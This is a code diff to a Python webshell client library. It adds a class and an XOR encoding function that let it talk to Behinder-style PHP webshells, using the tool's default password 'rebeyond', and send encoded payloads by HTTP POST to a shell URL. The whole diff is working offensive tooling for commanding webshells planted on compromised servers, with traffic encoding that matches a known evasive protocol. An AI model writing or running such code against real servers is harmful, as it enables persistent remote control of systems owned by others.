@@ -68,7 +68,7 @@ else if(filesize($filePath) > MAX_SIZE) {
 }
 """
 
-__all__ = ["PHPWebshell", "PHPWebshellOneliner", "PHPWebshellBehinderAES"]
+__all__ = ["PHPWebshell", "PHPWebshellOneliner", "PHPWebshellBehinderAES", "PHPWebshellBehinderXor"]
 
 
 def md5_encode(s):
@@ -89,6 +89,12 @@ def behinder_aes(payload, key):
     payload = "1|" + payload
     payload = pad(payload.encode(), AES.block_size)
     return base64_encode(cipher.encrypt(payload))
+
+
+def behinder_xor(payload: str, key: bytes):
+    payload = ("1|" + payload).encode()
+    payload = bytes([c ^ key[i+1&15] for i, c in enumerate(payload)])
+    return base64_encode(payload)
 
 
 @dataclass
@@ -299,3 +305,24 @@ class PHPWebshellBehinderAES(PHPWebshell):
                 return response.status_code, response.text
         except httpx.HTTPError as exc:
             raise exceptions.NetworkError("发送HTTP请求失败") from exc
+
+class PHPWebshellBehinderXor(PHPWebshell):
+    def __init__(
+        self,
+        url: str,
+        password: str,  # "rebeyond"
+        options: t.Union[PHPWebshellOptions, None] = None,
+    ):
+        super().__init__(options)
+        self.url = url
+        self.key = md5_encode(password)[:16].encode()
+
+    async def submit_raw(self, payload):
+        data = behinder_xor(payload, self.key)
+        try:
+            async with httpx.AsyncClient() as client:
+                response = await client.request(method="POST", url=self.url, data=data)
+                return response.status_code, response.text
+        except httpx.HTTPError as exc:
+            raise exceptions.NetworkError("发送HTTP请求失败") from exc
+
